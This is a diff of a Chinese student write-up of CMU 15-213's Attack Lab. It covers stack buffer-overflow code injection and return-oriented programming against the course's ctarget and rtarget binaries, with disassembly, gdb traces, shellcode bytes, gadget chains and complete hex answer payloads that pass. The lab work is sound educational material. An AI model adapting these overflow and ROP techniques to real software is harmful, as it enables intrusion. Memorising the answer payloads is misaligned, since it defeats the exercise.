@@ -1,6 +1,157 @@
 本实验一定要仔细阅读文档, 这个实验知识了解性的, 文档上帮我们免去了很多麻烦.
 
-# 实验1
+# 实验1 Code Injection Attacks 代码注入攻击
+
+每个函数都有一个栈帧, 我们的核心目的就是在getbuf()的时候, 利用buf修改掉return的rsp的地址. （这块需要了解栈结构, 去看课本）
+
+常用操作
+
+```
+./hex2raw < ans1/ans1.txt > ans1/ans1-raw.txt 
+
+./ctarget -q -i ans1/ans1-raw.txt 
+
+gcc -c inject.s
+
+objdump -d inject.o
+
+run -q -i ans1/ans1-raw.txt 
+
+./hex2raw <ans2/raw_string.txt> ans2/ans2.txt
+
+./rtarget -q -i ans2/ans2.txt
+```
+
+### level1
+
+```
+void test()
+{
+    int val;
+    val = getbuf();
+    printf("No exploit. Getbuf returned 0x%x\n", val);
+}
+
+Dump of assembler code for function test:
+    0x0000000000401968 <+0>:	sub    $0x8,%rsp
+   0x000000000040196c <+4>:	 mov    $0x0,%eax
+   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
+   0x0000000000401976 <+14>:	mov    %eax,%edx
+   0x0000000000401978 <+16>:	mov    $0x403188,%esi
+   0x000000000040197d <+21>:	mov    $0x1,%edi
+   0x0000000000401982 <+26>:	mov    $0x0,%eax
+   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
+   0x000000000040198c <+36>:	add    $0x8,%rsp
+   0x0000000000401990 <+40>:	retq   
+End of assembler dump.
+```
+
+```
+unsigned getbuf()
+{
+    char buf[BUFFER_SIZE];
+    Gets(buf); // 其实这个Gets怎么样并不影响实验
+    return 1;
+}
+
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
+   0x00000000004017ac <+4>:	mov    %rsp,%rdi
+   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:	mov    $0x1,%eax
+   0x00000000004017b9 <+17>:	add    $0x28,%rsp
+   0x00000000004017bd <+21>:	retq   
+End of assembler dump.
+```
+
+```
+(gdb) disas touch1
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
+
+touch1的地址可以从上面看到, 我们存储的时候是小端存储, 因而低位在低地址，高位在高地址。
+
+所以level1的ans是
+00 00 00 00
+00 00 00 00
+44 33 22 66
+00 00 00 00
+00 00 00 00
+00 00 00 00
+11 11 11 11
+00 00 00 00
+00 00 00 00
+12 32 42 54
+c0 17 40 00
+```
+
+### level2
+
+```
+(gdb) disas touch2
+Dump of assembler code for function touch2:
+   0x00000000004017ec <+0>:	sub    $0x8,%rsp
+   0x00000000004017f0 <+4>:	mov    %edi,%edx
+   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
+   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
+   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
+   0x0000000000401809 <+29>:	mov    $0x1,%edi
+   0x000000000040180e <+34>:	mov    $0x0,%eax
+   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401818 <+44>:	mov    $0x2,%edi
+   0x000000000040181d <+49>:	callq  0x401c8d <validate>
+   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
+   0x0000000000401824 <+56>:	mov    $0x403110,%esi
+   0x0000000000401829 <+61>:	mov    $0x1,%edi
+   0x000000000040182e <+66>:	mov    $0x0,%eax
+   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401838 <+76>:	mov    $0x2,%edi
+   0x000000000040183d <+81>:	callq  0x401d4f <fail>
+   0x0000000000401842 <+86>:	mov    $0x0,%edi
+   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
+End of assembler dump.
+```
+
+当我们注入的时候，打开调试，可以发现我们又回去执行了一圈, 范围是0x000000005561dc78到0x000000005561dca0
+
+```
+(gdb) 
+
+0x000000005561dc78 in ?? ()
+
+(gdb)
+
+0x000000005561dc7d in ?? ()
+
+(gdb)
+
+0x000000005561dc82 in ?? ()
+
+(gdb) stepi
+
+0x000000005561dc87 in ?? ()
+
+(gdb)
+
+0x000000005561dc8c in ?? ()
+
+(gdb)
+
+0x000000005561dc91 in ?? ()
+```
+
+说实话, 还是第一次用这种操作, 我们竟然把自己写的汇编转成机器语言了
+
+```
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi // 把我们cookie的位置传给rdi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq   
+
+// 要结合自己的cookie，仔细阅读文档, 其实答案都写在上面了，只是自己动手实操一下
+48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+```
 
 ### level3
 
@@ -31,7 +182,7 @@ ret
 35 39 62 39 39 37 66 61 00  // cookie，用ascii码
 ```
 
-# 实验2
+# 实验2 ROP 返回指向攻击
 
 ### level2
 
@@ -235,7 +386,6 @@ ret
 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax
 
 4019cf: c3 retq
-
 ```
 
 我们在getbuf的栈空间下分别写上这些
@@ -277,4 +427,148 @@ lab attacklab
 result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
 ```
 
+### level3
 
+文档中说超出了课程期望, 也就是可以不做这个实验，但秉承着好奇心， 还是看一看. 在上一个level3，我们做的事情其实就是
+
+```
+mov $0x5561dca8,%rdi
+push $0x4018fa
+ret
+```
+
+难点在于字符串，我们怎么把字符串插入还不影响我们的程序执行呢？由于栈的运行是一行一行的, 我们没法用pop把字符串传递给寄存器, 只能把字符串写入内存, 为了不执行字符串，要把字符串放在ret touch3后面.
+
+我们怎么把字符串给到程序?对于动态的栈这里只能用offset传递了.
+
+```
+00000000004019d6 <add_xy>:
+4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax
+4019da: c3 retq
+```
+
+level2已经用到了pop %rax, 和mov %rax,%rdi
+现在我们还可以借用%rax, 同时
+
+mov %rax,%rsi
+
+mov %rax,%rdi
+
+我们的步骤可能就是
+
+offset->rax
+
+rax->rsi,
+
+rsp->rax
+
+rax->rdi,
+
+rdi + rsi ->rax ,
+
+rax->rdi
+
+->touch3
+
+由于gadget有限, 我们只能用机器代码一点一点凑出来, 也许会比上面的预想更曲折
+
+```
+00000000004019db <getval_481>:
+
+4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax // 89 c2 90 mov %eax,%edx
+
+4019e0: c3 retq 
+
+
+0000000000401a11 <addval_436>:
+
+401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax // 89 ce 90 mov %ecx,%esi
+
+401a17: c3 retq 
+
+
+0000000000401a68 <getval_311>:
+
+401a68: b8 89 d1 08 db mov $0xdb08d189,%eax //89 d1 08 db(08 db 不影响) mov %edx, %ecx
+
+401a6d: c3 retq 
+
+
+0000000000401a03 <addval_190>:
+
+401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax // 48 89 e0 mov %rsp,%rax
+
+401a09: c3 retq
+```
+
+所以答案应该如下, 注意这里很容易错, 因为哪里数错了等等都不容易发现, 又要重新检查, 哪怕是发现正确答案还因为小错误卡了半个小时。
+
+```cc 19 40 00 00 00 00 00 pop
+offset // 要根据在哪一行给的rsp确定
+
+4019dd // mov %eax,%edx
+
+401a69 // mov %edx, %ecx
+
+401a13 // mov %ecx,%esi
+
+401a06 // mov %rsp,%rax
+
+c5 19 40 00 00 00 00 00 // mov %rax,%rdi
+
+4019d6 // addx_y
+
+c5 19 40 00 00 00 00 00 // mov %rax,%rdi
+
+fa 18 40 00 00 00 00 00 // touch3 address
+
+35 39 62 39 39 37 66 61 00 cookie ascii
+
+---
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+cc 19 40 00 00 00 00 00
+
+20 00 00 00 00 00 00 00
+
+dd 19 40 00 00 00 00 00
+
+69 1a 40 00 00 00 00 00
+
+13 1a 40 00 00 00 00 00
+
+06 1a 40 00 00 00 00 00
+
+c5 19 40 00 00 00 00 00
+
+d6 19 40 00 00 00 00 00
+
+c5 19 40 00 00 00 00 00
+
+fa 18 40 00 00 00 00 00
+
+35 39 62 39 39 37 66 61
+
+00 00 00 00 00 00 00 00
+```
+
+```
+root@instance-bexsitjk:~/labs/attack# ./rtarget -q -i ans2/ans2.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 
+```
